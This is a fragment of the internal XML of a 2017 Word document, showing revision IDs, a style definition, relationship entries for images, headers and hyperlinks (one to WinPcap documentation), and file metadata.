    <w:rsid w:val="00F84BF5"/>
    <w:rsid w:val="00F86F4A"/>
    <w:rsid w:val="00F91F18"/>
    <w:rsid w:val="00F929BC"/>
    <w:rsid w:val="00FA45AC"/>
    <w:rsid w:val="00FA5EF4"/>
    <w:rsid w:val="00FA6980"/>
    <w:rsid w:val="00FA70CF"/>
    <w:rsid w:val="00FB146B"/>
    <w:rsid w:val="00FC0BDB"/>
    <w:rsid w:val="00FC790D"/>
    <w:rsid w:val="00FD0F33"/>
    <w:rsid w:val="00FD1562"/>
    <w:rsid w:val="00FD2189"/>
    <w:rsid w:val="00FD2739"/>
    <w:rsid w:val="00FD29BA"/>
    <w:rsid w:val="00FD3A0C"/>
    <w:rsid w:val="00FD4EB1"/>
    <w:rsid w:val="00FD5A53"/>
    <w:rsid w:val="00FE4BF4"/>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37D5647"/>
  <w15:docId w15:val="{509C665B-ECE8-4CDC-80A5-BC1703C7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 w:type="paragraph" w:styleId="TOC">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="1"/>
    <w:next w:val="a"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00A765AC"/>
    <w:pPr>
      <w:widowControl/>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="left"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7.png"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer7.xm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eader" Target="header13.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2.xml"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.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1.png"/><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2.xml"/><Relationship Id="rId49"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image" Target="media/image12.png"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.china-pub.com/3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hyperlink" Target="http://www.ferrisxu.com/WinPcap/html/group__wpcapfunc.html"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header" Target="header1.xml"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header14.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0FE48-3548-4440-88D4-6686A792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7337</Words>
  <Characters>41824</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>348</Lines>
  <Paragraphs>98</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>49063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2</cp:revision>
  <cp:lastPrinted>2017-04-19T08:48:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2017-05-15T00:05:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-05-15T00:05:00Z</dcterms:modified>
</cp:coreProperties>
</file>